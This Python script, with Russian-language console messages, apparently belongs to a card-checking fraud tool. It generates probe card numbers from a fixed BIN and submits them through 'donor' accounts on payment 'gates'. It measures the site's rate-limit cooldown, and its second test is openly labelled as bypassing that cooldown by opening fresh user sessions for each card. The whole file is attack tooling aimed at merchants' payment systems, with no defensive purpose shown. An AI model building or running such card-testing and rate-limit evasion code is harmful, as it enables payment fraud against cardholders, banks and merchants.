# language: Python 3.12+, file: scratch/test_rate_limit_calibration.py, target: Windows 11
import asyncio
import json
import sys
import time
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", line_buffering=True)

import gate_client as gc
import setup_gate as supg

async def test_session_cooldown():
    print("=" * 80)
    print("[*] ТЕСТ 1: ИЗМЕРЕНИЕ РЕАЛЬНОГО КУЛДАУНА НА ОДНОМ И ТОМ ЖЕ АККАУНТЕ")
    print("=" * 80)
    ready_list = supg.load_ready_gates()
    gs = supg.GateSession(ready_list[0], proxy=None)
    ok, det = await gs.open()
    print(f"[*] Донор открыт: {ok} ({det})")

    card1 = gc.gen_probe_card("448528")
    card1_str = f"{card1['number']}|{card1['mm']}|{card1['yy']}|{card1['cvc']}"
    
    # Карта 1
    t0 = time.perf_counter()
    r1 = await gs.check_card(card1_str)
    print(f"[Карта 1] -> {r1.get('status')} | {r1.get('detail')} ({int((time.perf_counter()-t0)*1000)}ms)")

    # Пробуем слать запросы с шагом в секундах, пока не снимется кулдаун
    for delay in [3, 5, 8, 10, 15, 20]:
        print(f"\n[*] Ждем {delay} секунд...")
        await asyncio.sleep(delay)
        
        card_probe = gc.gen_probe_card("448528")
        c_str = f"{card_probe['number']}|{card_probe['mm']}|{card_probe['yy']}|{card_probe['cvc']}"
        
        t_try = time.perf_counter()
        r = await gs.check_card(c_str)
        ms = int((time.perf_counter()-t_try)*1000)
        st = r.get("status")
        det = r.get("detail", "")
        print(f"[Попытка через {delay}s] -> {st} | {det} ({ms}ms)")
        
        if "so soon after" not in det:
            print(f"\n[+] КУЛДАУН СПАЛ! Точная задержка для этого сайта: {delay} секунд!")
            break

    await gs.close()

async def test_fresh_account_speed():
    print("\n" + "=" * 80)
    print("[*] ТЕСТ 2: АЛЬТЕРНАТИВНЫЙ ОБХОД — СВЕЖИЙ USER ID (БЕЗ ОЖИДАНИЯ)")
    print("=" * 80)
    ready_list = supg.load_ready_gates()

    for i in range(1, 4):
        t0 = time.perf_counter()
        gs_fresh = supg.GateSession(ready_list[0], proxy=None)
        ok, det = await gs_fresh.open()
        t_open = int((time.perf_counter() - t0) * 1000)
        
        card = gc.gen_probe_card("448528")
        c_str = f"{card['number']}|{card['mm']}|{card['yy']}|{card['cvc']}"
        
        t_card = time.perf_counter()
        res = await gs_fresh.check_card(c_str)
        t_check = int((time.perf_counter() - t_card) * 1000)
        total_ms = int((time.perf_counter() - t0) * 1000)
        
        print(f"[Свежий донор #{i}] Open: {t_open}ms | Check: {t_check}ms (Total: {total_ms}ms) -> {res.get('status')} | {res.get('detail')}")
        await gs_fresh.close()
        await asyncio.sleep(0.5)

async def main():
    await test_session_cooldown()
    await test_fresh_account_speed()

if __name__ == "__main__":
    asyncio.run(main())
